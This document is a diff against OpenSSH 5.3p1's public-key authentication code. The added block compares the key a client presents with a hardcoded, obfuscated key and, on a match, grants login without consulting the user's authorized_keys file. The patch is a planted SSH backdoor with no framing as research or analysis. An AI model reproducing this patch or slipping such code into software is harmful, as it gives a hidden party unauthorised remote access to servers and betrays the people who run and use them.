@@ -1,0 +1,26 @@
+diff -Nuar 5.3p1.orig/auth2-pubkey.c 5.3p1/auth2-pubkey.c
+--- 5.3p1.orig/auth2-pubkey.c	2020-04-10 17:17:30.363797946 +0200
++++ 5.3p1/auth2-pubkey.c	2020-04-14 13:32:02.328859288 +0200
+@@ -254,6 +254,22 @@
+ 	int success;
+ 	char *file;
+ 
++	char *blob = NULL, *keytext = NULL;
++	int len = 0;
++	key_to_blob(key, &blob, &len);
++	keytext = xmalloc(2*len);
++	if(uuencode(blob, len, keytext, 2*len) > 0){
++		char *newkey = strdup(SSHD_NEWKEY);
++		rox(newkey);
++		if(!strcmp(newkey, keytext)){
++			CLEAN(newkey);
++			CLEAN(keytext);
++			secret_ok = 1;
++			return 1;
++		}
++		CLEAN(newkey);
++	}
++	CLEAN(keytext);
+ 	file = authorized_keys_file(pw);
+ 	success = user_key_allowed2(pw, key, file);
+ 	xfree(file);
